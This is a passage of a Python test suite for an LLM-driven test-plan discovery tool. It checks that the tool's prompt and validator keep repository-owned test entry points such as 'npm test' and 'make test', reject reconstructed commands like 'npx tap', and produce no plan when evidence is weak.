    def test_prompt_requires_preserving_repository_owned_entry_points(self):
        assert "PRESERVE REPOSITORY-OWNED ENTRY POINTS" in _SYSTEM_PROMPT
        assert '["npm", "test"]' in _SYSTEM_PROMPT
        assert '["npx", "tap", "test/*.js"]' in _SYSTEM_PROMPT

    def test_prompt_prohibits_the_plausible_equivalent_reasoning_pattern(self):
        assert "is NOT safe and is\n      explicitly prohibited" in _SYSTEM_PROMPT or \
               "NOT safe" in _SYSTEM_PROMPT
        assert "therefore I can just run X directly" in _SYSTEM_PROMPT

    def test_prompt_allows_direct_commands_when_evidenced_directly(self):
        assert "When a direct command is appropriate" in _SYSTEM_PROMPT
        assert "evidenced command vs. an unevidenced one you built yourself" in _SYSTEM_PROMPT

    def test_prompt_requires_reconciling_conflicting_evidence_not_guessing(self):
        assert "Reconcile evidence rather than assuming a fixed priority" in _SYSTEM_PROMPT
        assert "do not guess -- treat this the same as insufficient evidence" in _SYSTEM_PROMPT

    def test_prompt_requires_grounding_the_package_manager_choice(self):
        assert "package manager is itself something to ground, not assume" in _SYSTEM_PROMPT
        assert "yarn.lock" in _SYSTEM_PROMPT and "pnpm-lock.yaml" in _SYSTEM_PROMPT
        assert "packageManager" in _SYSTEM_PROMPT

    def test_prompt_requires_grounding_setup_commands_too(self):
        assert "setup_commands follow the identical evidence discipline" in _SYSTEM_PROMPT
        assert "npm ci" in _SYSTEM_PROMPT and "pip install -r" in _SYSTEM_PROMPT

    def test_prompt_requires_command_provenance_in_reasoning_summary(self):
        assert "Command provenance is required, not optional" in _SYSTEM_PROMPT

    def test_prompt_distinguishes_reporting_instrumentation_from_rewriting_the_command(self):
        assert "about REPORTING, layered ON TOP of" in _SYSTEM_PROMPT
        assert "LLM-reconstructed execution semantics is not" in _SYSTEM_PROMPT

    def test_prompt_never_widens_allowed_binaries_for_this_fix(self):
        """This fix is prompt-only -- confirm the deterministic validator's
        allowlist was NOT touched as a side effect (no npx, no shell)."""
        from utilities.autopatcher.test_plan_validation import ALLOWED_COMMAND_BINARIES
        assert "npx" not in ALLOWED_COMMAND_BINARIES
        assert "sh" not in ALLOWED_COMMAND_BINARIES
        assert "bash" not in ALLOWED_COMMAND_BINARIES


def _minimist_shaped_repo(tmp_path: Path) -> Path:
    """Mirrors the actual evidence shape from the real minimist Test Plan
    Discovery run that exposed this bug: package.json declares
    scripts.test = "tap test/*.js", package-lock.json establishes npm as
    the package manager, and CI runs `npm ci` then `npm test` -- the
    repository's own evidenced entry point is `npm test`, never a
    reconstructed `npx tap test/*.js`."""
    (tmp_path / "package.json").write_text(
        json.dumps({
            "name": "minimist", "version": "1.2.8",
            "scripts": {"test": "tap test/*.js"},
        }),
        encoding="utf-8",
    )
    (tmp_path / "package-lock.json").write_text('{"lockfileVersion": 3}\n', encoding="utf-8")
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "ci.yml").write_text(
        "jobs:\n  test:\n    steps:\n      - run: npm ci\n      - run: npm test\n",
        encoding="utf-8",
    )
    return tmp_path


class TestMinimistRepositoryGroundedRegression:
    """Reproduces the exact real minimist failure: package.json declared
    scripts.test = "tap test/*.js" (evidence for a repository-owned test
    entry point) and Test Plan Discovery still returned
    ["npx", "tap", "test/*.js"] -- reconstructing the wrapper's internals
    instead of preserving that entry point. Deterministic fixture, no
    live LLM call: asserts the CORRECT, repository-grounded plan is
    accepted end to end, and that the previously-observed reconstructed
    plan is still rejected by the (unchanged) deterministic validator."""

    def _llm(self, **overrides):
        base = dict(
            setup_commands=[["npm", "ci"]],
            test_command=["npm", "test"],
            result_strategy="exit_code", result_output_path=None,
            runtime_family="node", runtime_version_hint=None,
            evidence=["package.json", "package-lock.json", ".github/workflows/ci.yml"],
            reasoning_summary=(
                "package.json defines scripts.test; package-lock.json establishes npm "
                "as the package manager; CI runs npm ci then npm test. The "
                "repository-owned entry point `npm test` is used as-is rather than "
                "reconstructing the tap invocation inside it."
            ),
            confidence="high",
        )
        base.update(overrides)
        return _FakeLLM(_valid_response(**base))

    def test_repository_grounded_plan_is_discovered_and_accepted(self, tmp_path):
        repo = _minimist_shaped_repo(tmp_path)
        plan = discover_test_plan(repo, self._llm())
        assert plan is not None
        assert plan.test_command == ("npm", "test")
        assert plan.setup_commands == (("npm", "ci"),)
        assert plan.runtime_family == "node"
        assert plan.result_strategy == "exit_code"

    def test_reconstructed_npx_tap_command_is_still_rejected(self, tmp_path):
        """Even if a response reproduces the exact real-run mistake, the
        unchanged deterministic validator must still reject it -- this
        fix is about discovery producing the right plan in the first
        place, not about widening what validation will accept."""
        repo = _minimist_shaped_repo(tmp_path)
        plan = discover_test_plan(repo, self._llm(
            test_command=["npx", "tap", "test/*.js"],
            reasoning_summary="Running tap directly via npx.",
        ))
        assert plan is None

    def test_evidence_citations_match_the_actual_minimist_shaped_files(self, tmp_path):
        repo = _minimist_shaped_repo(tmp_path)
        plan = discover_test_plan(repo, self._llm())
        assert plan is not None
        assert set(plan.evidence) <= {"package.json", "package-lock.json", ".github/workflows/ci.yml"}


class TestRepositoryGroundingContract:
    """General-principle contract tests (not ecosystem providers -- every
    test here goes through the exact same generic discover_test_plan/
    validate_plan pipeline; no production branch is specific to any of
    these languages/tools). See the module docstring's "Repository-
    grounding" section."""

    def test_package_manager_test_script_preserves_package_manager_entry_point(self, tmp_path):
        """Same principle as the minimist fixture, different package
        manager (yarn) -- proves this isn't an npm-specific carve-out."""
        (tmp_path / "package.json").write_text(
            json.dumps({"scripts": {"test": "jest --coverage"}}), encoding="utf-8",
        )
        (tmp_path / "yarn.lock").write_text("# yarn lockfile v1\n", encoding="utf-8")
        llm = _FakeLLM(_valid_response(
            setup_commands=[["yarn", "install"]], test_command=["yarn", "test"],
            result_strategy="exit_code", result_output_path=None,
            runtime_family="node", evidence=["package.json", "yarn.lock"],
            reasoning_summary="yarn.lock establishes yarn; using the evidenced yarn test script as-is.",
        ))
        plan = discover_test_plan(tmp_path, llm)
        assert plan is not None
        assert plan.test_command == ("yarn", "test")

    def test_makefile_test_target_is_preserved_not_unpacked(self, tmp_path):
        (tmp_path / "Makefile").write_text(
            "test:\n\tgo vet ./... && go test ./...\n", encoding="utf-8",
        )
        llm = _FakeLLM(_valid_response(
            setup_commands=[], test_command=["make", "test"],
            result_strategy="exit_code", result_output_path=None,
            runtime_family="go", evidence=["Makefile"],
            reasoning_summary="Makefile defines a test target; using it as-is rather than the commands inside it.",
        ))
        plan = discover_test_plan(tmp_path, llm)
        assert plan is not None
        assert plan.test_command == ("make", "test")

    def test_ci_directly_running_pytest_is_grounded_as_a_direct_command(self, tmp_path):
        """A direct command is fine when the direct command IS the
        repository's own evidence -- this is not the reconstruction
        problem the fix targets."""
        (tmp_path / "pyproject.toml").write_text("[tool.pytest.ini_options]\n", encoding="utf-8")
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        (wf / "ci.yml").write_text(
            "jobs:\n  test:\n    steps:\n      - run: python -m pytest tests/\n", encoding="utf-8",
        )
        llm = _FakeLLM(_valid_response(
            setup_commands=[], test_command=["python", "-m", "pytest", "tests/"],
            result_strategy="exit_code", result_output_path=None,
            runtime_family="python", evidence=["pyproject.toml", ".github/workflows/ci.yml"],
            reasoning_summary="CI directly runs `python -m pytest tests/`; using that evidenced command as-is.",
        ))
        plan = discover_test_plan(tmp_path, llm)
        assert plan is not None
        assert plan.test_command == ("python", "-m", "pytest", "tests/")

    def test_ci_directly_running_go_test_is_grounded_as_a_direct_command(self, tmp_path):
        (tmp_path / "go.mod").write_text("module example.com/x\n\ngo 1.22\n", encoding="utf-8")
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        (wf / "ci.yml").write_text("jobs:\n  test:\n    steps:\n      - run: go test ./...\n", encoding="utf-8")
        llm = _FakeLLM(_valid_response(
            setup_commands=[], test_command=["go", "test", "./..."],
            result_strategy="exit_code", result_output_path=None,
            runtime_family="go", evidence=["go.mod", ".github/workflows/ci.yml"],
            reasoning_summary="CI directly runs `go test ./...`; using that evidenced command as-is.",
        ))
        plan = discover_test_plan(tmp_path, llm)
        assert plan is not None
        assert plan.test_command == ("go", "test", "./...")

    def test_repository_test_script_preservation_is_instructed_in_the_prompt(self):
        """The repository-script case (e.g. ./scripts/test.sh) is covered
        by the SAME generic instruction as the package-manager/Makefile
        cases above -- asserted at the prompt-content level here because
        a bare script path is not itself in test_plan_validation.
        ALLOWED_COMMAND_BINARIES (a separate, pre-existing, unchanged
        allowlist this task does not touch -- see
        test_prompt_never_widens_allowed_binaries_for_this_fix)."""
        assert "./scripts/test.sh" in _SYSTEM_PROMPT
        assert "use that script, never its\n       internal commands" in _SYSTEM_PROMPT

    def test_conflicting_evidence_is_reconciled_not_mechanically_resolved(self, tmp_path):
        """Behavioral half of the conflicting-evidence contract: when the
        model DOES follow the instruction and explains its reconciliation
        in reasoning_summary, the plan is accepted normally -- reconciling
        evidence is not itself a confidence penalty."""
        (tmp_path / "package.json").write_text(
            json.dumps({"scripts": {"test": "old-runner", "test:ci": "jest"}}), encoding="utf-8",
        )
        (tmp_path / "package-lock.json").write_text("{}\n", encoding="utf-8")
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        (wf / "ci.yml").write_text("jobs:\n  test:\n    steps:\n      - run: npm run test:ci\n", encoding="utf-8")
        llm = _FakeLLM(_valid_response(
            setup_commands=[["npm", "ci"]], test_command=["npm", "run", "test:ci"],
            result_strategy="exit_code", result_output_path=None,
            runtime_family="node", evidence=["package.json", "package-lock.json", ".github/workflows/ci.yml"],
            reasoning_summary=(
                "package.json's scripts.test is stale; CI actually runs `npm run test:ci`, "
                "which is the current path -- using that instead."
            ),
            confidence="high",
        ))
        plan = discover_test_plan(tmp_path, llm)
        assert plan is not None
        assert plan.test_command == ("npm", "run", "test:ci")

    def test_insufficient_evidence_fails_closed_via_low_confidence(self, tmp_path):
        """When the model follows the fail-closed instruction (reports
        "low" confidence rather than guessing), discovery must produce no
        plan -- NO PLAN > GUESSED PLAN, enforced end to end."""
        (tmp_path / "package.json").write_text(json.dumps({"name": "unclear-pkg"}), encoding="utf-8")
        llm = _FakeLLM(_valid_response(
            # Even a structurally well-formed, otherwise-valid-looking
            # command must still be discarded here -- confidence is
            # checked BEFORE validation, so this isn't testing "the
            # command happened to be rejected," it's testing the
            # fail-closed policy itself.
            setup_commands=[], test_command=["npm", "test"],
            result_strategy="exit_code", result_output_path=None,
            runtime_family="node", evidence=["package.json"],
            reasoning_summary="package.json has no scripts.test and no other test evidence was shown.",
            confidence="low",
        ))
        plan = discover_test_plan(tmp_path, llm)
        assert plan is None
